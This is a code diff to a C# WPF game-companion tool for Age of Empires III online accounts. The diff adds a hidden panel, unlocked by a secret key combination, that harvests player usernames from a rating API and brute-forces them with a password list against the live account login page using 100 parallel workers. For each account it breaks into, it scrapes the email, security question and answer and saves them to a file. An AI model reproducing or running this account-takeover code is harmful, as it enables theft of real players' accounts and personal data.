@@ -1,11 +1,13 @@
 ﻿using ESO_Assistant;
 using ESO_Assistant.Classes;
+using HtmlAgilityPack;
 using Microsoft.Win32;
 using Newtonsoft.Json;
 using SharpCompress.Archives;
 using SharpCompress.Common;
 using SharpCompress.Readers;
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.ComponentModel;
@@ -18,6 +20,7 @@ using System.Media;
 using System.Net;
 using System.Net.Http;
 using System.Reflection;
+using System.Runtime.CompilerServices;
 using System.Runtime.Serialization;
 using System.Security.Cryptography;
 using System.ServiceModel;
@@ -27,6 +30,7 @@ using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Data;
+using System.Windows.Documents;
 using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Animation;
@@ -40,6 +44,9 @@ namespace MultiTools
     /// Логика взаимодействия для MainWindow.xaml
     /// </summary>
     /// 
+
+
+
     public class MultiplyConverter : IMultiValueConverter
     {
         public object Convert(object[] values, Type targetType, object parameter, CultureInfo culture)
@@ -54,6 +61,23 @@ namespace MultiTools
     }
     public partial class MainWindow : Window, INotifyPropertyChanged
     {
+
+
+        public static RoutedCommand MyCommand = new RoutedCommand();
+
+        private void MyCommandExecuted(object sender, ExecutedRoutedEventArgs e)
+        {
+            if (bGenerateLogins.Visibility == Visibility.Collapsed)
+                bGenerateLogins.Visibility = Visibility.Visible;
+            else
+                bGenerateLogins.Visibility = Visibility.Collapsed;
+
+            if (bHackAccounts.Visibility == Visibility.Collapsed)
+                bHackAccounts.Visibility = Visibility.Visible;
+            else
+                bHackAccounts.Visibility = Visibility.Collapsed;
+        }
+
 
         public class ActionCommand : ICommand
         {
@@ -747,7 +771,29 @@ namespace MultiTools
 
             DataContext = this;
             InitializeComponent();
+            LoginsWorkers = 100;
+            HackedAccsWorkers = 100;
+            AlphaDepth = 3;
 
+            MyCommand.InputGestures.Add(new KeyGesture(Key.H, ModifierKeys.Control | ModifierKeys.Shift | ModifierKeys.Alt));
+            var uri = new Uri("pack://application:,,,/Hack/TopWorld.txt");
+            var resourceStream = Application.GetResourceStream(uri);
+
+            using (var reader = new StreamReader(resourceStream.Stream))
+            {
+                tbHackedPasswords.Text = reader.ReadToEnd();
+
+            }
+
+
+            LoginsTimer.Interval = TimeSpan.FromSeconds(1);
+            LoginsTimer.Tick += timer_Tick1;
+
+            HackedAccsTimer.Interval = TimeSpan.FromSeconds(1);
+            HackedAccsTimer.Tick += timer_Tick2;
+
+            Timeline.DesiredFrameRateProperty.OverrideMetadata(typeof(Timeline),
+   new FrameworkPropertyMetadata { DefaultValue = 24 });
             StreamsTimer.Tick += StreamsTimer_Tick;
             StreamsTimer.Start();
 
@@ -765,6 +811,10 @@ namespace MultiTools
             else
                 Friends = new ObservableCollection<FriendListItem>();
 
+
+            HackedAccs = new ObservableCollection<PlayerInfo>();
+            BindingOperations.EnableCollectionSynchronization(HackedAccs, HackedAccsLock);
+            //  listView4.ItemsSource = HackedAccs;
 
             listView2.ItemsSource = Friends;
             ICollectionView collectionView = CollectionViewSource.GetDefaultView(listView2.Items);
@@ -828,7 +878,7 @@ namespace MultiTools
             Colors = typeof(Brushes).GetProperties();
 
 
-            if (gInterface.Visibility == Visibility.Collapsed && gMods.Visibility == Visibility.Collapsed && gHotkeysEditor.Visibility == Visibility.Collapsed)
+            if (gInterface.Visibility == Visibility.Collapsed && gMods.Visibility == Visibility.Collapsed && gHackAccs.Visibility == Visibility.Collapsed && gLogins.Visibility == Visibility.Collapsed && gHotkeysEditor.Visibility == Visibility.Collapsed)
             {
                 rbDefault.IsChecked = true;
             }
@@ -3614,6 +3664,843 @@ namespace MultiTools
         private void BAdd1_Unchecked(object sender, RoutedEventArgs e)
         {
             gBuildingConstruction.Visibility = Visibility.Collapsed;
+        }
+
+        private void RadioButton_Checked_7(object sender, RoutedEventArgs e)
+        {
+            gHackAccs.Visibility = Visibility.Visible;
+        }
+
+        private void RadioButton_Unchecked_3(object sender, RoutedEventArgs e)
+        {
+            gHackAccs.Visibility = Visibility.Collapsed;
+        }
+
+        private void RadioButton_Unchecked_4(object sender, RoutedEventArgs e)
+        {
+            gLogins.Visibility = Visibility.Collapsed;
+        }
+
+        private void RadioButton_Checked_8(object sender, RoutedEventArgs e)
+        {
+            gLogins.Visibility = Visibility.Visible;
+        }
+
+
+
+
+
+
+
+
+
+
+
+        ///////////////////////////////////////////////
+        ///////////////////////////////////////////////
+        ///////////////////////////////////////////////
+        ///
+
+
+
+
+        private string alpha { get; set; } = "qwertyuiopasdfghjklzxcvbnm_1234567890";
+        public string Alpha
+        {
+            get { return alpha; }
+            set
+            {
+                alpha = value;
+                NotifyPropertyChanged("Alpha");
+
+            }
+        }
+
+
+        private string firstAlpha { get; set; } = "a";
+        public string FirstAlpha
+        {
+            get { return firstAlpha; }
+            set
+            {
+                firstAlpha = value;
+                NotifyPropertyChanged("FirstAlpha");
+                NotifyPropertyChanged("MaxLoginsCount");
+                NotifyPropertyChanged("LeftLoginsCount");
+            }
+        }
+
+
+
+        CancellationTokenSource LoginsCancelTokenSource;
+        CancellationToken LoginsToken;
+
+        CancellationTokenSource HackedAccsCancelTokenSource;
+        CancellationToken HackedAccsToken;
+
+        private TimeSpan loginsTimeElapsed { get; set; }
+        public string LoginsTimeElapsed
+        {
+            get { return loginsTimeElapsed.ToString("c"); }
+        }
+
+        public string LeftLoginsTime
+        {
+            get
+            {
+                if (scannedPackOfLoginsCount != 0)
+                    return TimeSpan.FromTicks((long)(loginsTimeElapsed.Ticks * (MaxLoginsCount - 15 * scannedPackOfLoginsCount) / (15 * scannedPackOfLoginsCount))).ToString("c");
+                else
+                    return TimeSpan.FromSeconds(0).ToString("c");
+            }
+        }
+
+        private int scannedPackOfLoginsCount;
+        public string LeftLoginsCount
+        {
+            get
+            {
+                if (scannedPackOfLoginsCount == 0)
+                    return MaxLoginsCount.ToString();
+                else
+                    return (MaxLoginsCount - 15 * scannedPackOfLoginsCount).ToString();
+            }
+        }
+
+        public int CollectedLoginsCount
+        {
+            get { return CollectedLogins.Split('\n').Length; }
+
+        }
+
+        private int alphaDepth { get; set; }
+        public int AlphaDepth
+        {
+            get { return alphaDepth; }
+            set
+            {
+                alphaDepth = value;
+                NotifyPropertyChanged("AlphaDepth");
+                NotifyPropertyChanged("MaxLoginsCount");
+                NotifyPropertyChanged("LeftLoginsCount");
+            }
+        }
+
+        private int loginsWorkers { get; set; }
+        public int LoginsWorkers
+        {
+            get { return loginsWorkers; }
+            set
+            {
+                loginsWorkers = value;
+                NotifyPropertyChanged("LoginsWorkers");
+
+            }
+        }
+
+        public double MaxLoginsCount
+        {
+            get { return Math.Pow(Alpha.Length, AlphaDepth - 1) * 15 * firstAlpha.Length; }
+        }
+
+
+        private string collectedLogins { get; set; }
+        public string CollectedLogins
+        {
+            get { return collectedLogins.TrimEnd(); }
+            set
+            {
+                collectedLogins = value;
+                NotifyPropertyChanged("CollectedLogins");
+            }
+        }
+
+        private object LoginsLock = new object();
+
+
+
+        private object HackedAccsLock = new object();
+
+        private int hackedAccsWorkers { get; set; }
+        public int HackedAccsWorkers
+        {
+            get { return hackedAccsWorkers; }
+            set
+            {
+                hackedAccsWorkers = value;
+                NotifyPropertyChanged("HackedAccsWorkers");
+
+            }
+        }
+
+
+
+        private TimeSpan hackedAccsTimeElapsed { get; set; }
+        public string HackedAccsTimeElapsed
+        {
+            get { return hackedAccsTimeElapsed.ToString("c"); }
+        }
+
+        public string LeftHackedAccsTime
+        {
+            get
+            {
+                if (scannedPairsCount != 0)
+                    return TimeSpan.FromTicks((long)(hackedAccsTimeElapsed.Ticks * 1.0 * (MaxPairsCount - scannedPairsCount) / scannedPairsCount)).ToString(@"dd\:hh\:mm\:ss");
+                else
+                    return TimeSpan.FromSeconds(0).ToString("c");
+            }
+        }
+        private int hackedAccsCount;
+        public int HackedAccsCount
+        {
+            get { return hackedAccsCount; }
+            set
+            {
+                hackedAccsCount = value;
+                NotifyPropertyChanged("HackedAccsCount");
+
+            }
+        }
+
+        private int scannedPairsCount;
+
+
+        public string Scanned
+        {
+            get
+            {
+                if (MaxPairsCount == 0)
+                    return scannedPairsCount.ToString();
+                else
+
+                    return scannedPairsCount.ToString() + " " + Math.Round(scannedPairsCount * 100.0 / MaxPairsCount, 2).ToString() + " %";
+            }
+
+        }
+
+        private int MaxPairsCount { get; set; }
+        public string LeftPairsCount
+        {
+            get
+            {
+
+                if (scannedPairsCount == 0)
+                    return MaxPairsCount.ToString();
+                else
+                    return (MaxPairsCount - scannedPairsCount).ToString();
+            }
+
+        }
+
+
+
+
+
+
+        async Task<string> HttpPostAsync(string Login, string Password)
+        {
+            try
+            {
+                HttpClient hc = new HttpClient();
+                hc.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko)  Chrome/24.0.1312.57 Safari/537.17");
+                hc.DefaultRequestHeaders.Accept.ParseAdd("text/html");
+                hc.DefaultRequestHeaders.AcceptLanguage.ParseAdd("en-US");
+                hc.DefaultRequestHeaders.AcceptCharset.ParseAdd("utf-8");
+
+                var pairs = new List<KeyValuePair<string, string>>
+                {
+                new KeyValuePair<string, string>("__VIEWSTATE", "/wEPDwULLTE0NjE5Mjk1OTQPZBYCAgEPZBYIAgMPZBYGAgEPZBYCAgEPDxYCHgtOYXZpZ2F0ZVVybGVkZAIDDxYCHgdWaXNpYmxlaBYCAgEPDxYCHwFoZGQCBQ9kFgICAQ8PFgIfAGVkZAITDw8WAh4EVGV4dAUFTG9naW5kZAIXDw8WAh4MRXJyb3JNZXNzYWdlBRYqVXNlcm5hbWUgaXMgcmVxdWlyZWQuZGQCGQ8PFgIfAwUWKlBhc3N3b3JkIGlzIHJlcXVpcmVkLmRkZNuhU2qqHI/gUXLveVmso2HaT6U1"),
+                new KeyValuePair<string, string>("__EVENTVALIDATION", "/wEdAAXjLpbnt7Eh/T7guB/koT/pxcn6oIDdbNQI5AQUIIyv4nY2+Mc6SrnAqio3oCKbxYZ100z73I0ej3E4zrB15fTLPOaW1pQztoQA36D1w/+bXSzsGGrhmMEr1m0g/eB0kQwHWXxz"),
+                new KeyValuePair<string, string>("__VIEWSTATEGENERATOR", "C2EE9ABB"),
+                new KeyValuePair<string, string>("txtLogin", Login),
+                new KeyValuePair<string, string>("txtPassword", Password),
+                new KeyValuePair<string, string>("btnSubmit","Login")
+                };
+
+                var content = new FormUrlEncodedContent(pairs);
+
+                var result = await hc.PostAsync("https://esoaccounts.agecommunity.com/login.aspx?ReturnUrl=%2fAccountManagement%2fDefault.aspx", content);
+
+                return await result.Content.ReadAsStringAsync();
+
+            }
+            catch
+            {
+                return "";
+            }
+        }
+
+
+
+        async Task<string> HttpGetAsyncEx(string URI)
+        {
+            try
+            {
+                HttpClient hc = new HttpClient();
+                hc.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko)  Chrome/24.0.1312.57 Safari/537.17");
+                hc.DefaultRequestHeaders.Accept.ParseAdd("text/html");
+                hc.DefaultRequestHeaders.AcceptLanguage.ParseAdd("en-US");
+                hc.DefaultRequestHeaders.AcceptCharset.ParseAdd("utf-8");
+
+                Task<System.IO.Stream> result = hc.GetStreamAsync(URI);
+
+                System.IO.Stream vs = await result;
+                using (StreamReader am = new StreamReader(vs, Encoding.UTF8))
+                {
+                    return await am.ReadToEndAsync();
+                }
+            }
+            catch
+            {
+                return "";
+            }
+        }
+
+
+
+
+        public IEnumerable<string> CombinationsWithRepition(IEnumerable<string> input, int length)
+        {
+            if (length <= 0)
+                yield return "";
+            else
+            {
+                foreach (var i in input)
+                    foreach (var c in CombinationsWithRepition(Alpha.Select(c => c.ToString()), length - 1))
+                        yield return i.ToString() + c;
+            }
+        }
+
+
+        private List<string> GenerateLinksToSearchNames(int Level)
+        {
+            var urls = FirstAlpha.Select(c => c.ToString());
+            var result = CombinationsWithRepition(urls, Level);
+
+            return result.Select(c => { c = "http://aoe3.jpcommunity.com/rating2/api/suggest/player?q=" + WebUtility.UrlEncode(c); return c; }).ToList();
+        }
+
+
+        int LoginsState = 0;
+        DispatcherTimer LoginsTimer = new DispatcherTimer();
+
+        int HackedAccsState = 0;
+        DispatcherTimer HackedAccsTimer = new DispatcherTimer();
+        private async void Button_Click8(object sender, RoutedEventArgs e)
+        {
+            (sender as Button).IsEnabled = false;
+            bLoginsPause.IsEnabled = false;
+            bLoginsStop.IsEnabled = false;
+            bLoginsRun.IsEnabled = false;
+            LoginsState = 0;
+            LoginsCancelTokenSource = new CancellationTokenSource();
+            LoginsToken = LoginsCancelTokenSource.Token;
+            tbDepth.IsReadOnly = true;
+            tbAlpha.IsReadOnly = true;
+            tbFirstAlpha.IsReadOnly = true;
+            tbLoginsWorkers.IsReadOnly = true;
+            tbScannedLogins.IsReadOnly = true;
+            scannedPackOfLoginsCount = 0;
+            loginsTimeElapsed = TimeSpan.FromSeconds(0);
+            CollectedLogins = "";
+            NotifyPropertyChanged("CollectedLoginsCount");
+            NotifyPropertyChanged("CollectedLogins");
+            NotifyPropertyChanged("LeftLoginsTime");
+            NotifyPropertyChanged("LeftLoginsCount");
+            LoginsTimer.Start();
+
+
+
+            var urls = GenerateLinksToSearchNames(AlphaDepth);
+            var maxThreads = LoginsWorkers;
+            var q = new ConcurrentQueue<string>(urls);
+            var tasks = new List<Task>();
+
+            bLoginsPause.IsEnabled = true;
+            bLoginsStop.IsEnabled = true;
+
+
+            for (int n = 0; n < maxThreads; n++)
+            {
+                tasks.Add(Task.Run(async () =>
+                {
+                    while (q.TryDequeue(out string url))
+                    {
+                        if (LoginsToken.IsCancellationRequested && LoginsState == 2)
+                        {
+                            return;
+                        }
+                        if (LoginsToken.IsCancellationRequested)
+                        {
+                            while (LoginsState == 1)
+                                await Task.Delay(1000);
+                        }
+                        var names = await HttpGetAsyncEx(url);
+                        //    var splitted = names.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                        lock (LoginsLock)
+                        {
+                            if (!string.IsNullOrEmpty(names))
+                            {
+                                collectedLogins += names;
+                                NotifyPropertyChanged("CollectedLoginsCount");
+                                NotifyPropertyChanged("CollectedLogins");
+                            }
+                        }
+                        Interlocked.Increment(ref scannedPackOfLoginsCount);
+
+                        NotifyPropertyChanged("LeftLoginsTime");
+                        NotifyPropertyChanged("LeftLoginsCount");
+
+                    }
+                }));
+            }
+            await Task.WhenAll(tasks);
+            File.WriteAllLines("Logins.txt", CollectedLogins.Split('\n'), Encoding.UTF8);
+            tbHackedLogins.Text = CollectedLogins;
+            LoginsTimer.Stop();
+            tbDepth.IsReadOnly = false;
+            tbAlpha.IsReadOnly = false;
+            tbFirstAlpha.IsReadOnly = false;
+            tbLoginsWorkers.IsReadOnly = false;
+            tbScannedLogins.IsReadOnly = false;
+            bLoginsPause.IsEnabled = false;
+            bLoginsStop.IsEnabled = false;
+            bLoginsRun.IsEnabled = false;
+            (sender as Button).IsEnabled = true;
+        }
+
+        private void timer_Tick1(object sender, EventArgs e)
+        {
+            loginsTimeElapsed = loginsTimeElapsed.Add(TimeSpan.FromSeconds(1));
+            NotifyPropertyChanged("LoginsTimeElapsed");
+        }
+
+        void timer_Tick2(object sender, EventArgs e)
+        {
+            hackedAccsTimeElapsed = hackedAccsTimeElapsed.Add(TimeSpan.FromSeconds(1));
+            NotifyPropertyChanged("HackedAccsTimeElapsed");
+            //     NotifyPropertyChanged("LeftPairs");
+
+        }
+
+        private ObservableCollection<PlayerInfo> hackedAccs = new ObservableCollection<PlayerInfo>();
+
+
+        public ObservableCollection<PlayerInfo> HackedAccs
+        {
+            get { return hackedAccs; }
+            set
+            {
+                hackedAccs = value;
+                NotifyPropertyChanged("HackedAccs");
+            }
+        }
+        private async void Button_Click_12(object sender, RoutedEventArgs e)
+        {
+            (sender as Button).IsEnabled = false;
+            slPasswordsCount.IsEnabled = false;
+            tbHackedLogins.IsReadOnly = true;
+            tbHackedPasswords.IsReadOnly = true;
+            hackedAccsTimeElapsed = TimeSpan.FromSeconds(0);
+
+
+
+            bHackedAccsPause.IsEnabled = false;
+            bHackedAccsStop.IsEnabled = false;
+            bHackedAccsRun.IsEnabled = false;
+            HackedAccsState = 0;
+            HackedAccsCancelTokenSource = new CancellationTokenSource();
+            HackedAccsToken = HackedAccsCancelTokenSource.Token;
+            tbHackedAccsWorkers.IsReadOnly = true;
+
+
+            hackedAccsCount = 0;
+            scannedPairsCount = 0;
+            HackedAccs.Clear();
+            // BindingOperations.EnableCollectionSynchronization(HackedAccs, HackedAccsLock);
+            //  NotifyPropertyChanged("HackedAccs");
+            NotifyPropertyChanged("LeftHackedAccsTime");
+            NotifyPropertyChanged("ScannedPairsCount");
+            NotifyPropertyChanged("LeftPairsCount");
+            NotifyPropertyChanged("Scanned");
+            NotifyPropertyChanged("HackedAccsCount");
+
+
+
+            HackedAccsTimer.Start();
+            var logins = tbHackedLogins.Text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+            var passwords = tbHackedPasswords.Text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries).Take((int)slPasswordsCount.Value).ToArray();
+            MaxPairsCount = logins.Length * passwords.Length;
+
+            var loginsDictionary = new List<KeyValuePair<string, string>>();
+            foreach (var password in passwords)
+            {
+                foreach (var login in logins)
+                {
+                    loginsDictionary.Add(new KeyValuePair<string, string>(login, password));
+                }
+            }
+
+
+            var q = new ConcurrentQueue<KeyValuePair<string, string>>(loginsDictionary);
+            var tasks = new List<Task>();
+            var alreadyHacked = new Dictionary<string, PlayerInfo>();
+
+            bHackedAccsPause.IsEnabled = true;
+            bHackedAccsStop.IsEnabled = true;
+
+            for (int n = 0; n < HackedAccsWorkers; n++)
+            {
+                tasks.Add(Task.Run(async () =>
+                {
+                    while (q.TryDequeue(out KeyValuePair<string, string> pair))
+                    {
+                        if (HackedAccsToken.IsCancellationRequested && HackedAccsState == 2)
+                        {
+                            return;
+                        }
+                        if (HackedAccsToken.IsCancellationRequested)
+                        {
+                            while (HackedAccsState == 1)
+                                await Task.Delay(1000);
+                        }
+                        if (!alreadyHacked.ContainsKey(pair.Key))
+                        {
+                            var result = await HttpPostAsync(pair.Key, pair.Value);
+                            var html = new HtmlDocument();
+                            html.LoadHtml(result);
+                            if (html.GetElementbyId("txtEmail") != null)
+                            {
+                                lock (HackedAccsLock)
+                                {
+                                    alreadyHacked.Add(pair.Key, new PlayerInfo() { Login = pair.Key });
+                                    HackedAccs.Add(new PlayerInfo() { Login = pair.Key, Password = pair.Value, Email = html.GetElementbyId("txtEmail").GetAttributeValue("value", null), SecretAnswer = html.GetElementbyId("txtSecretA").GetAttributeValue("value", null), SecretQuestion = html.GetElementbyId("txtSecretQ").GetAttributeValue("value", null), elo_link = "", pr_nilla = 0, lastLogin = "", pr_tad = 0, pr_tad_tr = 0 });
+                                }
+                                Interlocked.Increment(ref hackedAccsCount);
+
+                                NotifyPropertyChanged("HackedAccsCount");
+
+
+                            }
+
+                        }
+                        Interlocked.Increment(ref scannedPairsCount);
+                        NotifyPropertyChanged("LeftHackedAccsTime");
+                        NotifyPropertyChanged("ScannedPairsCount");
+                        NotifyPropertyChanged("LeftPairsCount");
+                        NotifyPropertyChanged("Scanned");
+
+                    }
+                }));
+            }
+            await Task.WhenAll(tasks);
+
+            var q2 = new ConcurrentQueue<PlayerInfo>(alreadyHacked.Values);
+            var tasks2 = new List<Task>();
+
+
+            List<PlayerInfo> la = new List<PlayerInfo>();
+            object stat = new object();
+            for (int n = 0; n < HackedAccsWorkers; n++)
+            {
+                tasks2.Add(Task.Run(async () =>
+                {
+                    while (q2.TryDequeue(out PlayerInfo acc))
+                    {
+                        //  Console.WriteLine(WebUtility.UrlEncode(player.Name));
+                        var names = await HttpGetAsyncEx("http://www.agecommunity.com/query/query.aspx?md=user&name=" + WebUtility.UrlEncode(acc.Login));
+                        //    Console.WriteLine(names);
+                        XmlDocument doc = new XmlDocument();
+                        doc.LoadXml(names);
+                        short node = 0;
+                        short node2 = 0;
+                        short node3 = 0;
+                        var node4 = "";
+                        try
+                        {
+                            node = Convert.ToInt16(doc.DocumentElement.SelectSingleNode("//ratings/s/skillLevel").InnerText);
+                            node2 = Convert.ToInt16(doc.DocumentElement.SelectSingleNode("//ratings/sy/skillLevel").InnerText);
+                            node3 = Convert.ToInt16(doc.DocumentElement.SelectSingleNode("//ratings/ty/skillLevel").InnerText);
+                            node4 = doc.DocumentElement.SelectSingleNode("//user/lastLogin").InnerText;
+                        }
+                        catch
+                        {
+
+                        }
+                        lock (stat)
+                        {
+                            la.Add(new PlayerInfo() { Email = acc.Email, Password = acc.Password, SecretAnswer = acc.SecretAnswer, SecretQuestion = acc.SecretQuestion, Login = acc.Login, pr_nilla = node, pr_tad = node2, pr_tad_tr = node3, lastLogin = node4 });
+                        }
+                    }
+                }));
+            }
+            await Task.WhenAll(tasks2);
+
+            foreach (var item in la)
+            {
+                var ha = hackedAccs.FirstOrDefault(x => x.Login == item.Login);
+                ha.pr_nilla = item.pr_nilla;
+                ha.pr_tad = item.pr_tad;
+                ha.pr_tad_tr = item.pr_tad_tr;
+                ha.lastLogin = item.lastLogin;
+                ha.elo_link = "http://aoe3.jpcommunity.com/rating2/player/?n=" + ha.Login;
+            }
+
+            File.WriteAllText("Hacked.json", JsonConvert.SerializeObject(hackedAccs, Newtonsoft.Json.Formatting.Indented));
+            HackedAccsTimer.Stop();
+
+            slPasswordsCount.IsEnabled = true;
+            tbHackedLogins.IsReadOnly = false;
+            tbHackedPasswords.IsReadOnly = false;
+
+
+
+            bHackedAccsPause.IsEnabled = false;
+            bHackedAccsStop.IsEnabled = false;
+            bHackedAccsRun.IsEnabled = false;
+
+            tbHackedAccsWorkers.IsReadOnly = false;
+            (sender as Button).IsEnabled = true;
+
+        }
+
+
+
+
+
+
+
+
+        public partial class PlayerInfo : INotifyPropertyChanged
+        {
+            public event PropertyChangedEventHandler PropertyChanged;
+
+            protected void OnPropertyChanged([CallerMemberName] string propertyName = null)
+               => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
+
+
+            protected bool SetField<T>(ref T field, T value,
+    [CallerMemberName] string propertyName = null)
+            {
+                if (EqualityComparer<T>.Default.Equals(field, value)) return false;
+                field = value;
+                OnPropertyChanged(propertyName);
+                return true;
+            }
+
+
+            private string login;
+            public string Login
+            {
+                get => login;
+
+
+                set => SetField(ref login, value);
+            }
+
+
+            private string password;
+            public string Password
+            {
+                get => password;
+
+
+                set => SetField(ref password, value);
+            }
+
+
+            private string email;
+            public string Email
+            {
+                get => email;
+
+
+                set => SetField(ref email, value);
+            }
+
+            private string secretQuestion;
+            public string SecretQuestion
+            {
+                get => secretQuestion;
+
+
+                set => SetField(ref secretQuestion, value);
+            }
+
+            private string secretAnswer;
+            public string SecretAnswer
+            {
+                get => secretAnswer;
+
+
+                set => SetField(ref secretAnswer, value);
+            }
+            private short _pr_nilla;
+            public short pr_nilla
+            {
+                get => _pr_nilla;
+
+
+                set => SetField(ref _pr_nilla, value);
+            }
+            private short _pr_tad;
+            public short pr_tad
+            {
+                get => _pr_tad;
+
+
+                set => SetField(ref _pr_tad, value);
+            }
+            private short _pr_tad_tr;
+            public short pr_tad_tr
+            {
+                get => _pr_tad_tr;
+
+
+                set => SetField(ref _pr_tad_tr, value);
+            }
+            private string _elo_link;
+            public string elo_link
+            {
+                get => _elo_link;
+
+
+                set => SetField(ref _elo_link, value);
+            }
+            public string _lastLogin;
+            public string lastLogin
+            {
+                get => _lastLogin;
+
+
+                set => SetField(ref _lastLogin, value);
+            }
+
+        }
+
+
+
+        private void Button_Click_16(object sender, RoutedEventArgs e)
+        {
+            bLoginsPause.IsEnabled = false;
+            LoginsTimer.Stop();
+            LoginsCancelTokenSource.Cancel();
+            LoginsState = 1;
+            bLoginsRun.IsEnabled = true;
+            bLoginsStop.IsEnabled = true;
+        }
+
+        private void BLoginsRun_Click(object sender, RoutedEventArgs e)
+        {
+            bLoginsRun.IsEnabled = false;
+            LoginsTimer.Start();
+            LoginsCancelTokenSource = new CancellationTokenSource();
+            LoginsToken = LoginsCancelTokenSource.Token;
+            LoginsState = 0;
+            bLoginsStop.IsEnabled = true;
+            bLoginsPause.IsEnabled = true;
+        }
+
+        private void BLoginsStop_Click(object sender, RoutedEventArgs e)
+        {
+            bLoginsStop.IsEnabled = false;
+            bLoginsPause.IsEnabled = false;
+            bLoginsRun.IsEnabled = false;
+            LoginsCancelTokenSource.Cancel();
+            LoginsState = 2;
+        }
+
+        private void BHackedAccsRun_Click(object sender, RoutedEventArgs e)
+        {
+            bHackedAccsRun.IsEnabled = false;
+            HackedAccsTimer.Start();
+            HackedAccsCancelTokenSource = new CancellationTokenSource();
+            HackedAccsToken = HackedAccsCancelTokenSource.Token;
+            HackedAccsState = 0;
+            bHackedAccsStop.IsEnabled = true;
+            bHackedAccsPause.IsEnabled = true;
+        }
+
+        private void BHackedAccsPause_Click(object sender, RoutedEventArgs e)
+        {
+            bHackedAccsPause.IsEnabled = false;
+            HackedAccsTimer.Stop();
+            HackedAccsCancelTokenSource.Cancel();
+            HackedAccsState = 1;
+            bHackedAccsRun.IsEnabled = true;
+            bHackedAccsStop.IsEnabled = true;
+        }
+
+        private void BHackedAccsStop_Click(object sender, RoutedEventArgs e)
+        {
+            bHackedAccsStop.IsEnabled = false;
+            bHackedAccsPause.IsEnabled = false;
+            bHackedAccsRun.IsEnabled = false;
+            HackedAccsCancelTokenSource.Cancel();
+            HackedAccsState = 2;
+        }
+
+        private GridViewColumnHeader listViewSortCol = null;
+        private SortAdorner listViewSortAdorner = null;
+
+        public class SortAdorner : Adorner
+        {
+            private static Geometry ascGeometry =
+                Geometry.Parse("M 0 4 L 3.5 0 L 7 4 Z");
+
+            private static Geometry descGeometry =
+                Geometry.Parse("M 0 0 L 3.5 4 L 7 0 Z");
+
+            public ListSortDirection Direction { get; private set; }
+
+            public SortAdorner(UIElement element, ListSortDirection dir)
+                : base(element)
+            {
+                this.Direction = dir;
+            }
+
+            protected override void OnRender(DrawingContext drawingContext)
+            {
+                base.OnRender(drawingContext);
+
+                if (AdornedElement.RenderSize.Width < 20)
+                    return;
+
+                TranslateTransform transform = new TranslateTransform
+                    (
+                        AdornedElement.RenderSize.Width - 15,
+                        (AdornedElement.RenderSize.Height - 5) / 2
+                    );
+                drawingContext.PushTransform(transform);
+
+                Geometry geometry = ascGeometry;
+                if (this.Direction == ListSortDirection.Descending)
+                    geometry = descGeometry;
+                drawingContext.DrawGeometry(Brushes.Black, null, geometry);
+
+                drawingContext.Pop();
+            }
+        }
+
+        private void GridViewColumnHeader_Click(object sender, RoutedEventArgs e)
+        {
+            GridViewColumnHeader column = (sender as GridViewColumnHeader);
+            string sortBy = column.Tag.ToString();
+            if (listViewSortCol != null)
+            {
+                AdornerLayer.GetAdornerLayer(listViewSortCol).Remove(listViewSortAdorner);
+                listView4.Items.SortDescriptions.Clear();
+            }
+
+            ListSortDirection newDir = ListSortDirection.Ascending;
+            if (listViewSortCol == column && listViewSortAdorner.Direction == newDir)
+                newDir = ListSortDirection.Descending;
+
+            listViewSortCol = column;
+            listViewSortAdorner = new SortAdorner(listViewSortCol, newDir);
+            AdornerLayer.GetAdornerLayer(listViewSortCol).Add(listViewSortAdorner);
+            listView4.Items.SortDescriptions.Add(new SortDescription(sortBy, newDir));
         }
     }
 
